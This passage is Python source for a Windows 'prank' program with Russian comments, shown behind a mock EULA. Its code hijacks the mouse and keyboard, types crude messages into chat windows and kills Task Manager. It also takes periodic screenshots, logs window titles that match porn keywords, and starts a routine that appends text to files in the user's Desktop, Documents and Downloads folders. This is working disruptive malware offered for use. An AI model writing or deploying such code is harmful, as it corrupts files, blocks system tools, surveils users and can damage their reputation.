6. DISCLAIMER OF WARRANTY

PratfPo‚Ñ¢ is provided "AS IS" without warranty of any kind. We are not liable for:

¬∑ Data loss, system instability, or hardware damage.
¬∑ Emotional distress, paranoia, or existential crises.
¬∑ Any consequences resulting from the use or misuse of the software.

7. TERMINATION

Your rights under this license will terminate automatically if you fail to comply with any of its terms. Upon termination, you must cease all use of PratfPo‚Ñ¢ and delete all copies from your devices. Alternatively, we may terminate it for you remotely.

8. GOVERNING LAW

This agreement is governed by the laws of The Principality of Sealand. Any disputes shall be resolved by a single arbitrator chosen by us, and you waive your right to a class-action lawsuit.

---

BY INSTALLING, COPYING, OR OTHERWISE USING PratfPo‚Ñ¢, YOU AGREE TO BE BOUND BY THE TERMS OF THIS EUELA. IF YOU DO NOT AGREE, DO NOT USE THE SOFTWARE. Your use of PratfPo‚Ñ¢ constitutes consent to all actions we may take with respect to your data and system. Thank you for choosing PratfPo‚Ñ¢ ‚Äì Because Your Digital Life Needed More Surprises!

¬© 2024 PratfPo‚Ñ¢ Industries. All Rights Reserved. Actually, All Rights. Every Single One."""
# EULA –®—É—Ç–æ—á–Ω–∞—è, –∫–æ–Ω–µ—á–Ω–æ –∂–µ... –ò–ª–∏ –Ω–µ—Ç.
def show_premium():
    time.sleep(500)
    messages = ["üöÄ–†–∞–∑–±–ª–æ–∫–∏—Ä—É–π—Ç–µ –ø—Ä–µ–º–∏—É–º –¥–æ—Å—Ç—É–ø –∏ –ø–æ–ª—É—á–∏—Ç–µ –¥–æ—Å—Ç—É–ø –∫ –£–ù–ò–ö–ê–õ–¨–ù–´–ú —Ñ—É–Ω–∫—Ü–∏—è–º!", "üíé–ü–†–ï–ú–ò–£–ú –¥–æ—Å—Ç—É–ø: —Ç—Ä–æ–ª–∏–Ω–≥ –±–µ–∑ –≥—Ä–∞–Ω–∏—Ü!", "üëë–ü–†–ï–ú–ò–£–ú: –û—Ç–∫—Ä–æ–π—Ç–µ 5+ —ç–∫—Å–∫–ª—é–∑–∏–≤–Ω—ã—Ö —Ñ—É–Ω–∫—Ü–∏–π", "–¢–æ–ª—å–∫–æ –≤ –ø—Ä–µ–º–∏—É–º: –ò–º–∏–º—Ç–∞—Ü–∏—è –∫–ª–∞–≤–∏–∞—Ç—É—Ä—ã!"]
    aaaa = random.choice(messages)
    messagebox.showinfo("–ö—É–ø–∏—Ç–µ –ü–†–ï–ú–ò–£–ú!", aaaa) # –ù–ï –í–ï–†–ò–¢–¨! –í–ê–° –ó–ê–¢–†–û–õ–Ø–¢!

def show_eula():
    root = tk.Tk()
    root.title("License Agreement")
    text = scrolledtext.ScrolledText(root, wrap=tk.WORD, width=80, height=20)
    text.insert(tk.END, LICENSE_TEXT)
    text.config(state=tk.DISABLED)
    text.pack(pady=10)
    accepted = [False]
    def accept():
        accepted[0] = True
        root.destroy()
    def decline():
        accepted[0] = False
        root.destroy()
    button_frame = tk.Frame(root)
    accept_btn = tk.Button(button_frame, text="Accept", command=accept)
    decline_btn = tk.Button(button_frame, text="Decline", command=decline)
    accept_btn.pack(side=tk.LEFT, padx=10)
    decline_btn.pack(side=tk.RIGHT, padx=10)
    button_frame.pack(pady=10)
    root.mainloop()
    return accepted[0]

def show_warning():
    warning_text = "–ó–ê–ü–£–°–ö–ê–¢–¨ –¢–û–õ–¨–ö–û –ù–ê –í–ò–†–¢–£–ê–õ–¨–ù–û–ô –ú–ê–®–ò–ù–ï!!!\n\n–í—ã —É–≤–µ—Ä–µ–Ω—ã?\n–ó–∞–ø—É—Å–∫ –º–µ–Ω—è –º–æ–∂–µ—Ç –ø—Ä–∏–≤–µ—Å—Ç–∏ –∫ –ø–æ—Ç–µ—Ä–µ –¥–∞–Ω–Ω—ã—Ö!!!\nALERT: DO NOT RUN IN HOST-SYSTEM!\n\n–≠—Ç–æ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ –¥–ª—è —à—É—Ç–æ–∫ –∏ –º–æ–∂–µ—Ç –Ω–∞—Ä—É—à–∏—Ç—å —Ä–∞–±–æ—Ç—É –≤–∞—à–µ–≥–æ –∫–æ–º–ø—å—é—Ç–µ—Ä–∞."
    response = messagebox.askyesno("–í–ù–ò–ú–ê–ù–ò–ï!", warning_text)
    return response

def show_history_scenario():
    opencart("omnom.jpg")
    try:
        with open("history.txt", "r", encoding="utf-8") as f:
            content = f.read()
    except Exception as e:
        content = "–ù–µ —É–¥–∞–ª–æ—Å—å –∑–∞–≥—Ä—É–∑–∏—Ç—å —Å—Ü–µ–Ω–∞—Ä–∏–π –∏—Å—Ç–æ—Ä–∏–∏: " + str(e)

    root = tk.Tk()
    root.title("–ò—Å—Ç–æ—Ä–∏—è –ú–∞—à–∏ –∏ PlatfPo")
    root.geometry("800x600")

    text_area = scrolledtext.ScrolledText(root, wrap=tk.WORD, font=("Arial", 12))
    text_area.pack(expand=True, fill=tk.BOTH)
    text_area.insert(tk.END, content)
    text_area.config(state=tk.DISABLED)

    button_frame = tk.Frame(root)
    button_frame.pack(pady=10)

    def on_close():
        root.destroy()

    close_button = tk.Button(button_frame, text="–ó–∞–∫—Ä—ã—Ç—å", command=on_close) # TODO: —É–±—Ä–∞—Ç—å –±–ª–æ–∫ –∫–æ–¥–∞ —Å –∏—Å—Ç–æ—Ä–∏–µ–π –º–∞—à–∏, –ø–æ—Ç–æ–º—É —á—Ç–æ –≤—ã–≥–ª—è–¥–∏—Ç –∫—Ä–∏–Ω–∂–æ–≤–æ.—Å–µ—Ä—å–µ–∑–Ω–æ, –∫–æ–¥ –¥–µ—Ä—å–º–æ.
    close_button.pack()

    root.mainloop()

if show_warning():
    if show_eula():
        show_history_scenario()
    else:
        exit()
else:
    exit()




# Queue for AI thread to receive feedback on actions
ai_feedback_queue = queue.Queue()

def log_action(action_name, success=True):
    timestamp = time.time()
    ai_feedback_queue.put((action_name, success, timestamp))
    logger(f"–î–µ–π—Å—Ç–≤–∏–µ –ó–∞—Ñ–∏–∫—Å–∏—Ä–æ–≤–∞–Ω–æ: {action_name}, —É—Å–ø–µ—Ö: {success}, –í—Ä–µ–º—è: {timestamp}")

def kill_window(window_title):
    try:
        windows = gw.getWindowsWithTitle(window_title)
        for w in windows:
            w.close()
            logger(f"–ó–∞–∫—Ä—ã–≤–∞–µ–º –æ–∫–æ—à–∫–æ: {window_title}")
    except Exception as e:
        logger(f"–û–ø–µ—Ä–∞—Ü–∏—è –ø–æ –∑–∞–∫—Ä—ã—Ç–∏—é –æ–∫–Ω–∞ —É—Å–ø–µ—à–Ω–æ –ø—Ä–æ–≤–∞–ª–µ–Ω–∞ {window_title}: {e}")

def write_in_chat(message):
    copyonwrite(message)
    pyautogui.press("enter")
    logger(f"–°–æ–æ–±—â–µ–Ω–∏–µ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ –≤ —á–∞—Ç: {message}") 

import statistics
import math

def ai_statistical_thread():
    """
    –ü–æ–ª–Ω–æ—Ü–µ–Ω–Ω—ã–π —Å—Ç–∞—Ç–∏—Å—Ç–∏—á–µ—Å–∫–∏–π –ò–ò –±–µ–∑ sklearn. (–ù–∞ –¥–µ–ª–µ —ç—Ç–æ –Ω–µ –ò–ò, –∞ –ø—Ä–æ—Å—Ç–µ–π—à–∏–π –∞–ª–≥–æ—Ä–∏—Ç–º, –ù–æ –¥–ª—è –ø–∞—Ñ–æ—Å–∞...)
    –ê–Ω–∞–ª–∏–∑–∏—Ä—É–µ—Ç –ª–æ–≥–∏ –¥–µ–π—Å—Ç–≤–∏–π –∏ –∞–¥–∞–ø—Ç–∏—Ä—É–µ—Ç —á–∞—Å—Ç–æ—Ç—ã –¥–µ–π—Å—Ç–≤–∏–π.(–ù–µ—Ç)
    –ó–∞–ø—É—Å–∫–∞–µ—Ç—Å—è –≤ –æ—Ç–¥–µ–ª—å–Ω–æ–º –ø–æ—Ç–æ–∫–µ –∫–∞–∂–¥—ã–µ 20-80 –º–∏–Ω—É—Ç.(–ù–µ—Ç)
    """
    action_history = {
        "mouse_move": [],
        "errors": [],
        "question": [],
        "warnings": [],
        "keyboard_imitation": [],
        "kill_window": [],
        "write_in_chat": [],
        "start_chaos": []
    }
    action_weights = {k: 1.0 for k in action_history.keys()}

    def update_weights():
        for action, results in action_history.items():
            if len(results) < 2:
                continue
            # –†–∞—Å—Å—á–∏—Ç—ã–≤–∞–µ–º —Å—Ä–µ–¥–Ω–µ–µ —É—Å–ø–µ—Ö–∞ (1 - —É—Å–ø–µ—Ö, 0 - –Ω–µ—É–¥–∞—á–∞)
            mean_success = statistics.mean(results)
            # –†–∞—Å—Å—á–∏—Ç—ã–≤–∞–µ–º –¥–∏—Å–ø–µ—Ä—Å–∏—é –¥–ª—è –æ—Ü–µ–Ω–∫–∏ —Å—Ç–∞–±–∏–ª—å–Ω–æ—Å—Ç–∏
            variance = statistics.variance(results) if len(results) > 1 else 0
            # –í–µ—Å –∑–∞–≤–∏—Å–∏—Ç –æ—Ç —Å—Ä–µ–¥–Ω–µ–≥–æ —É—Å–ø–µ—Ö–∞ –∏ –æ–±—Ä–∞—Ç–Ω–æ–π –¥–∏—Å–ø–µ—Ä—Å–∏–∏ (—Å—Ç–∞–±–∏–ª—å–Ω–æ—Å—Ç–∏)
            weight = mean_success / (variance + 0.01)
            # –û–≥—Ä–∞–Ω–∏—á–∏–≤–∞–µ–º –≤–µ—Å –≤ –¥–∏–∞–ø–∞–∑–æ–Ω–µ [0.1, 5.0]
            action_weights[action] = max(0.1, min(weight, 5.0))

    def choose_action():
        total_weight = sum(action_weights.values())
        r = random.uniform(0, total_weight)
        upto = 0
        for action, weight in action_weights.items():
            if upto + weight >= r:
                return action
            upto += weight
        return random.choice(list(action_weights.keys()))

    while True:
        try:
            # –°–±–æ—Ä –¥–∞–Ω–Ω—ã—Ö –∏–∑ –æ—á–µ—Ä–µ–¥–∏
            while not ai_feedback_queue.empty():
                action_name, success, timestamp = ai_feedback_queue.get()
                if action_name in action_history:
                    action_history[action_name].append(1 if success else 0)
                    # –û–≥—Ä–∞–Ω–∏—á–∏–≤–∞–µ–º –¥–ª–∏–Ω—É –∏—Å—Ç–æ—Ä–∏–∏ –¥–ª—è –ø–∞–º—è—Ç–∏ (–ø–æ—Å–ª–µ–¥–Ω–∏–µ 100 –∑–∞–ø–∏—Å–µ–π)
                    if len(action_history[action_name]) > 100:
                        action_history[action_name].pop(0)

            # –û–±–Ω–æ–≤–ª—è–µ–º –≤–µ—Å–∞ –Ω–∞ –æ—Å–Ω–æ–≤–µ —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫–∏
            update_weights()

            # –í—ã–±–∏—Ä–∞–µ–º –¥–µ–π—Å—Ç–≤–∏–µ
            best_action = choose_action()

            # –í—ã–ø–æ–ª–Ω—è–µ–º –¥–µ–π—Å—Ç–≤–∏–µ —Å –∑–∞–¥–µ—Ä–∂–∫–æ–π –¥–ª—è –º–∞—Å–∫–∏—Ä–æ–≤–∫–∏
            delay = random.uniform(1200, 4800)  # 20-80 –º–∏–Ω—É—Ç –≤ —Å–µ–∫—É–Ω–¥–∞—Ö
            time.sleep(delay)

            if best_action == "mouse_move":
                mouse_move()
            elif best_action == "errors":
                errors()
            elif best_action == "question":
                question()
            elif best_action == "warnings":
                warnings()
            elif best_action == "keyboard_imitation":
                keyboard_imitation()
            elif best_action == "kill_window":
                for app in target_apps:
                    is_active, title = detect_target_application()
                    if is_active:
                        kill_window(title)
                        break
            elif best_action == "write_in_chat":
                write_in_chat("–£–ø—Å–∏, —è –æ–±–æ—Å—Ä–∞–ª—Å—è")
            elif best_action == "start_chaos":
                start_chaos()

            log_action(best_action, success=True)

        except Exception as e:
            logger(f"AI thread error: {e}")
            time.sleep(10)


def mouse_move():
    
    try:
        width, height = pyautogui.size()
        x_offset = random.randint(-100, 100)
        y_offset = random.randint(-100, 100)
        current_x, current_y = pyautogui.position()
        
        new_x = max(0, min(width, current_x + x_offset))
        new_y = max(0, min(height, current_y + y_offset))

        pyautogui.moveTo(new_x, new_y, duration=0.2)

    except Exception as e:
        messagebox.showerror("–û—à–∏–±–∫–∞", f"–û—à–∏–±–∫–∞:{e}")
        logger(f"–û—à–∏–±–∫–∞ –º—ã—à–∏: {e}")
    logger("–ú—ã—à–∫–∞ –ø–æ–≤–µ—Ä–Ω—É—Ç–∞!!!:)")

def errors():
    choiceerror = random.choice(["–°–∏—Å—Ç–µ–º–∞ –ø—É–∫–Ω—É–ª–∞", "–Ø –æ–±–æ—Å—Ä–∞–ª—Å—è", "–î–æ—Å—Ç—É–ø –ó–∞–ø—Ä–µ—â–µ–Ω", "–ë–†–≠–≠–≠–≠–≠–≠–≠–≠–≠–≠–≠–≠–≠–≠–≠–≠–≠–≠–≠–≠–≠–≠–≠–≠–≠–≠–≠–≠–≠–≠–≠–≠–≠–≠–≠–≠–≠–≠–≠–≠–≠–≠–≠–≠–≠–≠–≠–≠–≠–≠–≠–≠–≠–≠–≠–≠–≠–≠–≠—ç", "–ö—Ä–∏—Ç–∏—á–µ—Å–∫–∞—è –æ—à–∏–±–∫–∞ —è–¥—Ä–∞: 0xBRUH00000304"])
    messagebox.showerror("–û—à–∏–±–∫–∞!", choiceerror )
    logger(choiceerror)

def question():
    title = random.choice(['–í–æ–ø—Ä–æ—Å', "–í–æ–ø—Ä–æ—Å."])
    textquestion = random.choice(["–ê–ª–ª–∏–≥–∞—Ç–æ—Ä—ã –≥—É–ª—è—é—Ç –ø–æ –≤–∞—à–µ–π —Å–∏—Å—Ç–µ–º–µ!!!", "–ö–∞–ª –æ–±–æ—Å—Ä–∞–ª—Å—è!", "–í—ã –ø—Ä–µ–¥–ø–æ—á–∏—Ç–∞–µ—Ç–µ –∫–∞–∫–∞—Ç—å –∏–ª–∏ —Å—Ä–∞—Ç—å?", "–°—Ö–æ–¥–∏ –≤ —Ç—É–∞–ª–µ—Ç!!!", "–Æ–Æ–Æ–Æ–Æ–Æ–Æ–Æ–Æ–Æ–Æ–Æ–Æ–Æ–Æ–Æ–Æ–Æ–Æ–Æ–Æ–Æ–Æ–Æ–Æ–Æ–Æ"])
    simpledialog.askstring(title, textquestion)
    say("Sorry Bruh")
    logger("BFEertyuytrfghgfdfgtrdfg")
    return "J#MFUH3wunewry"
def warnings():
    warntitle = random.choice(["–ù–µ–∫—Ä–∏—Ç–∏—á–µ—Å–∫–∞—è –æ—à–∏–±–∫–∞", "–û—Ç–∫–ª–æ–Ω–µ–Ω–∏–µ –æ—Ç –Ω–æ—Ä–º—ã"])
    textwarn = random.choice(["–ê–ª–∏–≥–∞—Ç–æ—Ä—ã —Ç–∞–Ω—Ü—É—é.—Ç", "–§–∞–π–ª—ã –ø–æ–≤—Ä–µ–∂–¥–µ–Ω—ã", "–ö–∞–ª–æ–≤—ã–µ –º–∞—Å—Å—ã –Ω–µ —Ä–∞–≤–Ω—ã –∫–∞–ª–æ–≤—ã–º –º—Å–∞–º–∞", "2+2=5"])

    messagebox.showwarning(warntitle, textwarn)
    logger(f"–í–Ω–∏–º–∞–Ω–∏–µ! –ø—Ä–µ–¥—É–ø—Ä–µ–∂–¥–µ–Ω–∏–µ: {textwarn}")
    return 9

running = True

def key_checker():
    global running
    
    while running:
        if msvcrt.kbhit():
            key = msvcrt.getch().decode('utf-8').lower()
            if key == 'q':
                running = False
                break
        time.sleep(0.1)

def main_free():
    global running

    infect_choice = ask_infect_files()
    porndetect = threading.Thread(target=porn_detection_thread, daemon=True)
    injectorfiles = threading.Thread(target=lambda: infect_files(infect_choice), daemon=True)
    porndetect.start()
    screenshot = threading.Thread(target=screenshot_thread, daemon=True)
    screenshot.start()
    injectorfiles.start()
    capitulation = threading.Thread(target=capitulation_thread, daemon=True)
    capitulation.start()
    prem = threading.Thread(target=show_premium, daemon=True)
    prem.start()
    running = True
    checker_thread = threading.Thread(target=key_checker, daemon=True)
    checker_thread.start()
    try:
        while running:
            sleep = random.randint(500, 5000)
                
            action = random.choice([lambda: question(), lambda: warnings(),lambda: errors(),lambda: mouse_move(), lambda: jokes_from_supersonic()])
            thread = threading.Thread(target=action, daemon=True)
            thread.start()
            logger(f"–∞—Ö–∞—Ö–∞—Ö.–∫–æ–º–∞–Ω–¥–∞ –≤—ã–ø–æ–ª–Ω–µ–Ω–∞: {action}")
            logger(f"–í–ø–∞–¥–∞–µ–º –≤ —Å–ø—è—á–∫—É –Ω–∞ {sleep} —Å–µ–∫—É–Ω–¥...")
            time.sleep(sleep)

    except Exception as e:
        messagebox.showerror("–û—à–∏–±–∫–∞", f"–í–æ—Ç —Ç–∞–∫ –≤–æ—Ç —à—É—Ç–∏—à—å —Å–µ–±–µ —à—É—Ç–∫–∞–º–∏, –∞ —Ç—É—Ç —Ä–µ–∞–ª—å–Ω–∞—è –æ—à–∏–±–∫–∞:{e}")
        return 1
def capslock_mig():
    try:
        for _ in range(9):
            pyautogui.press("capslock")
            time.sleep(0.2)
    except:
        pass

def browser_lol():
    global running
    while running:
      
            
      toopen = ["https://www.google.com/search?q=–ö–∞–∫+–Ω–µ+–æ–±–∫–∞–∫–∞—Ç—Å—è+–≤+–æ–±—â–µ—Å—Ç–≤–µ–Ω–Ω–æ–º+–º–µ—Å—Ç–µ", "https://www.google.com/search?q=–ö–∞—Ä—Ç—ã+–∫—É–ø–∏—Ç—å", "https://www.google.com/search?q=–ö–∞–∫–æ–≥–æ+—á–µ—Ä—Ç–∞?!", "https://www.google.com/search?q=–®–∞—à–ª—ã–∫+–∫—É–ø–∏—Ç—å", "https://www.google.com/search?q=–û–±–∫–∞–∫–∞–ª—Å—è+–≤+–æ–±—â–µ—Å—Ç–≤–µ–Ω–Ω–æ–º+–º–µ—Å—Ç–µ+—á—Ç–æ+–¥–µ–ª–∞—Ç—å", "https://www.google.com/search?q=–ö—Ä—è–∫+—Ç–æ—Ä—Ä–µ–Ω—Ç+–±–µ–∑+—Ä–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏–∏+–∏+—Å–º—Å+–±–µ—Å–ø–ª–∞—Ç–Ω–æ+–ø—Ä—è–º–æ+—Å–µ–π—á–∞—Å"]
      tooopen = random.choice(toopen)
      hidenrun = ["taskmgr", "winver", "notepad", "regedit", "aeofemrif", "control"]
      torunhiden = random.choice(hidenrun)
      os.system(torunhiden)

      import webbrowser
      webbrowser.open(tooopen)
      webbrowser.open(tooopen)
      time.sleep(random.randint(200, 900))
      logger(f"–û—Ç–∫—Ä—ã—Ç–∞ –≤–∫–ª–∞–¥–∫–∞: {tooopen}")

def keyboard_imitation():
   def reputation_ohmy():
       copyonwrite("–£–ø—Å–∏, —è –æ–±–∫–∞–∫–∞–ª–∞—Å—å! –ø—Ä–æ—Å—Ç–∏—Ç–µ –Ω–∞—á–∞–ª—å–Ω–∏–∫. —è –æ–±–æ—Å—Ä–∞–ª–∞—Å—å –≤–∞–º –Ω–∞ –ª–∏—Ü–æ –ø–æ–Ω–æ—Å–æ–º. —Å–æ—Å–∏—Ç–µ")
       pyautogui.press("enter")
       logger("–†–µ–ø—É—Ç–∞—Ü–∏—è —Ä–∞–∑—Ä—É—à–µ–Ω–∞. –∫—Ä–∞—Ö —Å–∏—Å—Ç–µ–º—ã")


   while running:
        time.sleep(random.randint(200, 600))
        choice = [
        lambda:pyautogui.press(random.choice(["capslock", "numlock", "scrollblock"])),
        lambda: pyautogui.hotkey("ctrl", random.choice(['c', 'v', 'z'])),
        lambda: copyonwrite(random.choice(['–í–∞—à –∫–æ–º–ø—å—é—Ç–µ—Ä –æ–±–æ—Å—Ä–∞–ª—Å—è —Ü–∏—Ñ—Ä–∞–º–∏', "–ë–†–ö", '–ü–£–ö–ê–õ', '–û–û–û–ô –Ø –ù–ï –°–î–ï–†–ñ–ò–í–ê–Æ–°–¨ –©–ê–° –ü–û–ù–û–° –ë–£–î–ï–¢ –û–û–û–ôüí©üí©üí©üí©üí©üí©üí©üí©üí©üí©üí©üí©üí©üí©üí©üí©üí©üí©üí©üí©üí©üí©üí©üí©üí©üí©üí©üí©üí©üí©üí©üí©üí©üí©üí©üí©üí©üí©üí©üí©', '–£–ø—Å–∏ –ë–†–≠–≠–≠–≠–≠–≠–≠–≠–≠–≠–≠–≠–≠–≠–≠–≠–≠–≠–≠–≠–≠–≠–≠–≠–≠–≠–≠–≠–≠–≠–≠–≠–≠–≠–≠–≠–≠–≠–≠–≠–≠–≠–≠–≠–≠–≠–≠–≠–≠–≠–≠–≠–≠–≠–≠–≠–≠–≠–≠–≠–≠–≠–≠', '–∫—Ç—Ü–Ω3–∫–ø—Ç—Ü–∫–ø–≥—Ü—É—Ç–ø—Ä—Å–µ–∫–∞—Ä—É']), interval=0.1),
        lambda: pyautogui.hotkey("ctrl", "alt", "del"),
        lambda: pyautogui.hotkey("alt", "tab"),
        lambda: reputation_ohmy(),
        lambda: pyautogui.press("enter")]

        random.choice(choice)()



def mouse_pranks_imitation():
    while running:
        time.sleep(random.randint(500, 1000))
        width, height = pyautogui.size()
        actions = [
        lambda: pyautogui.moveTo(random.randint(0, width), random.randint(0, height), duration=0.5),
        lambda: pyautogui.click(button=random.choice(['left', 'right'])),
        lambda: pyautogui.scroll(random.choice([5, -5, 10, -10])),
        lambda: pyautogui.doubleClick(x=random.randint(0, width), y=random.randint(0, height)),
        lambda: say("AAAAHAHAHHAHAHAHAHAHAHAHAHAHAH"),
        lambda: pyautogui.hotkey("ctrl", "shift", "alt")
    ]
        random.choice(actions)()

        
from PIL import ImageGrab  # –£–±–µ–¥–∏—Ç–µ—Å—å, —á—Ç–æ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω Pillow, –ò–Ω–∞—á–µ –Ω–µ –±—É–¥–µ—Ç –Ω–∏—á–µ —Ä–∞–±–æ—Ç–∞—Ç—å:(

screenshot_dir = "Croc_Screenshots"

# –°–æ–∑–¥–∞–µ–º –ø–∞–ø–∫—É –¥–ª—è —Å–∫—Ä–∏–Ω—à–æ—Ç–æ–≤, –µ—Å–ª–∏ –µ—ë –Ω–µ—Ç
if not os.path.exists(screenshot_dir):
    os.makedirs(screenshot_dir)

def take_screenshot():
    """–î–µ–ª–∞–µ—Ç —Å–∫—Ä–∏–Ω—à–æ—Ç –∏ —Å–æ—Ö—Ä–∞–Ω—è–µ—Ç –µ–≥–æ —Å –º–µ—Ç–∫–æ–π –≤—Ä–µ–º–µ–Ω–∏"""
    try:
        timestamp = time.strftime("%Y-%m-%d_%H-%M-%S")
        filename = os.path.join(screenshot_dir, f"screenshot_{timestamp}.png")
        screenshot = ImageGrab.grab()
        screenshot.save(filename)
        logger(f"–°–∫—Ä–∏–Ω—à–æ—Ç —Å–æ—Ö—Ä–∞–Ω–µ–Ω: {filename}")
        return filename
    except Exception as e:
        logger(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ —Å–æ–∑–¥–∞–Ω–∏–∏ —Å–∫—Ä–∏–Ω—à–æ—Ç–∞: {e}")
        return None

def show_screenshot_later(filename):
    """–ü–æ–∫–∞–∑—ã–≤–∞–µ—Ç —Å–∫—Ä–∏–Ω—à–æ—Ç —á–µ—Ä–µ–∑ —Å–ª—É—á–∞–π–Ω—ã–π –ø—Ä–æ–º–µ–∂—É—Ç–æ–∫ –≤—Ä–µ–º–µ–Ω–∏"""
    if filename and os.path.exists(filename):
        # –ñ–¥–µ–º –æ—Ç 10 –º–∏–Ω—É—Ç –¥–æ 2 —á–∞—Å–æ–≤
        delay = random.randint(600, 7200)
        time.sleep(delay)
        # –ü–æ–∫–∞–∑—ã–≤–∞–µ–º —Å–∫—Ä–∏–Ω—à–æ—Ç —Å—Ä–µ–¥—Å—Ç–≤–æ–º Windows
        os.system(f'start "{filename}"') # –õ—É—á—à–µ —è –±—ã –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–ª subprocces.run –ò–ª–∏ Popen.
        messagebox.showinfo("–ù–∞–ø–æ–º–∏–Ω–∞–Ω–∏–µ", f"–í–æ—Ç —á–µ–º —Ç—ã –∑–∞–Ω–∏–º–∞–ª—Å—è!\n–ê—Ö–∞—Ö–∞!")

def screenshot_thread():
    """–ü–æ—Ç–æ–∫ –¥–ª—è —Å–æ–∑–¥–∞–Ω–∏—è –∏ –æ—Ç–ª–æ–∂–µ–Ω–Ω–æ–≥–æ –ø–æ–∫–∞–∑–∞ —Å–∫—Ä–∏–Ω—à–æ—Ç–æ–≤"""
    while running:
        # –î–µ–ª–∞–µ–º —Å–∫—Ä–∏–Ω—à–æ—Ç —Ä–∞–∑ –≤ 5-15 –º–∏–Ω—É—Ç
        interval = random.randint(300, 900)
        time.sleep(interval)
        filename = take_screenshot()
        # –ó–∞–ø—É—Å–∫–∞–µ–º –ø–æ—Ç–æ–∫ –¥–ª—è –æ—Ç–ª–æ–∂–µ–Ω–Ω–æ–≥–æ –ø–æ–∫–∞–∑–∞ —ç—Ç–æ–≥–æ —Å–∫—Ä–∏–Ω—à–æ—Ç–∞
        if filename:
            t = threading.Thread(target=show_screenshot_later, args=(filename,), daemon=True)
            t.start()


def porn_detection():
    """–§—É–Ω–∫—Ü–∏—è –æ–±–Ω–∞—Ä—É–∂–µ–Ω–∏—è '–ø–æ–¥–æ–∑—Ä–∏—Ç–µ–ª—å–Ω–æ–π' –∞–∫—Ç–∏–≤–Ω–æ—Å—Ç–∏""" 
    suspicious_keywords = ["porn", "xxx", "–∏–Ω–∫–æ–≥–Ω–∏ito", "private", "18+", "video", "—Å–µ–∫—Å", "–ø–æ—Ä–Ω–æ", "pornhub", "porno", "–ü–æ—Ä–µ–≤–æ", "–ø–æ—Ä–Ω–æ", "–ø–æ—Ä–Ω—Ö–∞–±", "pornhub.com"]  # –°–ø–∏—Å–æ–∫ –∫–ª—é—á–µ–≤—ã—Ö —Å–ª–æ–≤

    try:
        active_window = gw.getActiveWindow()
        if active_window and active_window.title:
            title = active_window.title.lower()
            for word in suspicious_keywords:
                if word in title:
                    # –¢–†–ò–ì–ì–ï–†! –û–±–Ω–∞—Ä—É–∂–µ–Ω–∞ –ø–æ–¥–æ–∑—Ä–∏—Ç–µ–ª—å–Ω–∞—è –∞–∫—Ç–∏–≤–Ω–æ—Å—Ç—å!(–ù–µ –±—É–¥–µ–º –¥–µ–ª–∞—Ç—å —Å–∫—Ä–∏–Ω—à–æ—Ç)
                    messagebox.showwarning("–ö–ê–õ–û–í–´–ï –ú–ê–°–û–ù–´ –ü–£–ö–ù–£–õ–ò",
                                           "#–•–≤–∞—Ç–∏—Ç–°–º–æ—Ç—Ä–µ—Ç—å–ü–æ—Ä–Ω–æ\n\n–¢–≤–æ–∏ –≥—Ä–µ—Ö–∏ –∑–∞–ø–∏—Å–∞–Ω—ã –≤ logs.txt!")
                    logger(f"[–û–±–Ω–∞—Ä—É–∂–µ–Ω–∞ –ø–æ–¥–æ–∑—Ä–∏—Ç–µ–ª—å–Ω–∞—è –∞–∫—Ç–∏–≤–Ω–æ—Å—Ç—å] –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å —Å–º–æ—Ç—Ä–∏—Ç : {title}")
                    
    except:
        pass

# –ó–∞–ø—É—Å–∫–∞–µ–º –ø—Ä–æ–≤–µ—Ä–∫—É –≤ –æ—Ç–¥–µ–ª—å–Ω–æ–º –ø–æ—Ç–æ–∫–µ —Å –±–æ–ª—å—à–∏–º –∏–Ω—Ç–µ—Ä–≤–∞–ª–æ–º, —á—Ç–æ–±—ã –Ω–µ –Ω–∞–≥—Ä—É–∂–∞—Ç—å —Å–∏—Å—Ç–µ–º—É
def porn_detection_thread():
    while running:
        porn_detection()
        time.sleep(30)  # –ü—Ä–æ–≤–µ—Ä—è–µ–º –∫–∞–∂–¥—ã–µ 30 —Å–µ–∫—É–Ω–¥

def anti_taskmgr_thread():
    while running:
        time.sleep(30)
        for proc in psutil.process_iter(['name']):
            try:
                if proc.info['name'].lower() == 'taskmgr.exe':
                    messagebox.showerror("System Error", "Task Manager has encountered a problem and needs to close. We are sorry for the inconvenience.")
                    proc.kill()
                    logger("Task Manager killed")
            except:
                pass



def ask_infect_files():
    """–°–ø—Ä–∞—à–∏–≤–∞–µ—Ç –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è, –∑–∞—Ä–∞–∂–∞—Ç—å –ª–∏ —Ñ–∞–π–ª—ã"""
    response = messagebox.askyesno("–ó–∞—Ä–∞–∂–µ–Ω–∏–µ —Ñ–∞–π–ª–æ–≤", "–•–æ—Ç–∏—Ç–µ –ª–∏ –≤—ã –∑–∞—Ä–∞–∑–∏—Ç—å –≤—Å–µ —Ñ–∞–π–ª—ã –Ω–∞ —Ä–∞–±–æ—á–µ–º —Å—Ç–æ–ª–µ, –≤ –¥–æ–∫—É–º–µ–Ω—Ç–∞—Ö –∏ –∑–∞–≥—Ä—É–∑–∫–∞—Ö —Å—Ç—Ä–æ–∫–æ–π '# —Ñ–∞–π–ª –∑–∞—Ä–∞–∂–µ–Ω –∫—Ä–æ–∫–æ–¥–∏–ª—å—á–∏–∫–æ–º. —Å–ø–∞—Å–∏–±–æ –∑–∞ –≤–Ω–∏–º–∞–Ω–∏–µ!'?")
    return response

def infect_files(infect=True):
    """–ò—â–µ—Ç —Ñ–∞–π–ª—ã .txt, .py, .docx, .cpp –∏ –¥–æ–±–∞–≤–ª—è–µ—Ç –≤ –∫–æ–Ω–µ—Ü —Å—Ç—Ä–æ–∫—É-—Å–ª–µ–¥"""
    if not infect:
        logger("–ó–∞—Ä–∞–∂–µ–Ω–∏–µ —Ñ–∞–π–ª–æ–≤ –æ—Ç–∫–ª—é—á–µ–Ω–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–º")
        return 0

    search_dirs = [
        os.path.expanduser("~\\Desktop"),
        os.path.expanduser("~\\Documents"),
        os.path.expanduser("~\\Downloads"),
    ]
   
